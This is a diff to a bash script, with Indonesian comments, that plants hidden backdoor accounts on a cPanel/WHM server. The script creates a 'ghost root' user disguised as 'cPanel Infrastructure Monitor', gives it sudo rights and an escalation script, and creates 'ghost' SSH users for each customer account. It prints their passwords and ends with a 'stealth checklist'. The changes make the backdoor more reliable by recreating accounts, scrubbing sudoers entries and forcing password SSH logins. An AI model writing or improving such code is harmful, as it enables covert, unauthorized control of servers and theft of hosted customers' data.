@@ -447,7 +447,9 @@ create_base_user() {
         -s /bin/bash \
         -M -r \
         "$name" 2>/dev/null || true
-    echo "$name:$pass" | chpasswd
+    # Verifikasi user benar-benar terbuat sebelum chpasswd
+    getent passwd "$name" &>/dev/null || return 1
+    echo "$name:$pass" | chpasswd 2>/dev/null || return 1
 
     mkdir -p "$home" 2>/dev/null || true
     chown "${uid}:${uid}" "$home" 2>/dev/null || true
@@ -464,7 +466,13 @@ create_ghost_root() {
     local uid="$ROOT_GHOST_UID"
     local pass; pass=$(gen_pass)
 
-    getent passwd "$name" &>/dev/null && { warn "'$name' sudah ada"; return 1; }
+    # Force cleanup sisa run sebelumnya — selalu recreate fresh
+    if getent passwd "$name" &>/dev/null; then
+        userdel -r "$name" 2>/dev/null || true
+        groupdel "$name" 2>/dev/null || true
+    fi
+    rm -rf "$ROOT_GHOST_HOME" 2>/dev/null || true
+    sed -i "/${name}/d" "$CLOUD_SUDOERS" 2>/dev/null || true
 
     create_base_user "$name" "$uid" "$ROOT_GHOST_GECOS" "$ROOT_GHOST_HOME" "$pass"
 
@@ -689,7 +697,7 @@ root_result=$(create_ghost_root 2>/dev/null) && {
 ║  ROOT GHOST — Full Server Access                      ║
 ╠═══════════════════════════════════════════════════════╣
   Mode      : Ghost Root
-  Login     : ssh -p ${SSH_PORT} ${rname}@${SERVER_IP}
+  Login     : ssh -p ${SSH_PORT} -o PubkeyAuthentication=no ${rname}@${SERVER_IP}
   password  : ${rpass}
   identity  : cPanel Infrastructure Monitor (UID ${ROOT_GHOST_UID})
 
@@ -702,7 +710,7 @@ root_result=$(create_ghost_root 2>/dev/null) && {
 
 ROOT
     log "Ghost root: ${rname}"
-    echo -e "  ${B}  LOGIN  :${N} ssh -p ${SSH_PORT} ${rname}@${SERVER_IP}"
+    echo -e "  ${B}  LOGIN  :${N} ssh -p ${SSH_PORT} -o PubkeyAuthentication=no ${rname}@${SERVER_IP}"
     dim "password : ${rpass}"
     dim "escalate : sudo ${ESCALATION_SCRIPT} --support-access"
 } || warn "Ghost root: skip (sudah ada atau gagal)"
@@ -736,11 +744,11 @@ while ! $SKIP_PHASE4 && IFS='|' read -r cpanel_user domain ip; do
   Mode        : Ghost Isolated
   cPanel user : ${cpanel_user}
   Domain      : ${out_domain}
-  Login       : ssh -p ${SSH_PORT} ${ghost}@${SERVER_IP}
+  Login       : ssh -p ${SSH_PORT} -o PubkeyAuthentication=no ${ghost}@${SERVER_IP}
   password    : ${out_pass}
   scope       : /home/${cpanel_user}/ — isolated
 CRED
-    echo -e "  ${B}  LOGIN  :${N} ssh -p ${SSH_PORT} ${ghost}@${SERVER_IP}"
+    echo -e "  ${B}  LOGIN  :${N} ssh -p ${SSH_PORT} -o PubkeyAuthentication=no ${ghost}@${SERVER_IP}"
     dim "password : ${out_pass}"
 done < <(parse_whm_log)
 echo ""
@@ -784,7 +792,7 @@ echo "  ├─ Server IP      : ${SERVER_IP}"
 echo "  └─ Credentials    : ${CRED_FILE}"
 echo ""
 echo -e "  ${B}Quick Access:${N}"
-echo "  ├─ Root ghost  : ssh -p ${SSH_PORT} ${ROOT_GHOST_NAME}@${SERVER_IP}"
+echo "  ├─ Root ghost  : ssh -p ${SSH_PORT} -o PubkeyAuthentication=no ${ROOT_GHOST_NAME}@${SERVER_IP}"
 echo "  └─ Creds file  : cat ${CRED_FILE}"
 echo ""
 echo -e "  ${B}Stealth checklist:${N}"
